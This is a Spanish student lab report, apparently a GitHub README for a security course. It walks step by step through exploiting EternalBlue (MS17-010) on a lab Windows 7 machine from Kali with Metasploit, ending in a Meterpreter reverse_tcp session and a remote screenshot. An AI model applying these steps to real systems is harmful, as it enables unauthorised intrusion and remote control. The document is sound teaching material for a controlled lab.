# SAD_2021--Vulnerabilidades---Metasploit

## Práctica del módulo de ***Seguridad y Alta Disponibilidad***

- Alumno: Fernando Páez Martín
- Curso: 2ºB - A.S.I.R.
- IES Punta del Verde

![alt Metalogo](Metasploit.png)

Haremos una busqueda de información sobre esta herramienta que permite ejecutar y desarrollar exploits contra sistemas objetivos. La primera opción antes de usar la propia herramienta va a consistir en recopilar información sobre el sistema objetivo. A partir de los datos obtenidos, se tomarán las decisiones acordes y los pasos a seguir en etapas posteriores.

- Descarga de las herramientas de Metasploitable y Máquina Virtual de Kali linux.
- Descarga de imagen iso de windows 7 para realizar el estudio de la vulnerabilidad y creacion de la máquina virtual.

## Recopilación de información

La tarea a desarrollar irá enfocada a la vulnerabilidad catalogada en la base de datos de vulnerabilidades CVE como:

[MS17-0144 - Eternalblue](https://www.cvedetails.com/cve/CVE-2017-0144/)

EternalBlue explota una vulnerabilidad en protocolo Server Message Block (SMB). Esta vulnerabilidad se dio porque el servidor SMB v1 (SMBv1) de Microsoft Windows manejaba mal paquetes especialmente diseñados por atacantes remotos, permitiendo ejecutar código sobre el equipo a que ataca.

## Configuración de las máquinas virtuales

Se configuran en un entorno llamado "Red Interna" y dentro del mismo rangode red:

- Kali con 10.0.2.10/8

 	![Ip Kali](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/1.png)

- Windows con 10.0.2.11/8
  
  ![Ip Windows](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/2.png)
  
- Comprobamos que las dos máquinas tienen conectividad entre si haciendo ping entre ellas:

  ![Ping Windows](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/3.png)
  
  ![Ping Kali](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/4.png)


## Ejecución de escaner de red Nmap

Con esta herramienta descubriremos puertos y servicios abiertos en la máquina objetivo.

  ![msfconsole](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/7.png)
  


## Metasploit Framework (MSF) 

En la primera fase ejecutaremos este framework para buscar exploits usar, descargar payloads y ejecutarlos.

**msfconsole**
 	
  ![msfconsole](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/5.png)


Usaremos su buscador para encontrar el exploit:

**search eternalblue**

  ![search msf](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/6.png)


De los resultados elegiremos la primera opción:

***0  exploit/windows/smb/ms17_010_eternalblue  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption***

**use 0**

  ![search msf](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/8.png)

Nos devuelve:

**No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp**


Vemos que parámetros son requeridos con el comando:
**options**

![options](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/9.png)


nos pide datos del equipo remoto o **RHOST**. Le indicamos la ip del equipo remoto 10.0.2.11

![set rhost](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/10.png)


Podemos ver una serie de payloads a ejecutar:

![varios payloads](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/11.png)


Vamos a realizar la prueba con el siguiente **windows/x64/meterpreter/reverse_tcp**:

![reverse_tcp](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/12.png)


Le indicamos que se ejecute con **run**

![run](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/13.png)


Podemos ver las distintas opciones que nos ofrece este exploit con **options**

![options](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/14.png)


Como ejemplo ejecutaremos el comando **screenshot** y nos hará una captura de pantalla de la máquina remota.


![screenshot](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/15.png)

Mostramos la captura realizada:

![screenshot2](https://github.com/fernandopaezmartin/SAD_2021--Vulnerabilidades---Metasploit/blob/main/imagenes/16.png)


# Video demostrativo#
<iframe width="560" height="315" src="https://www.youtube.com/embed/G-YtjZlQURI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
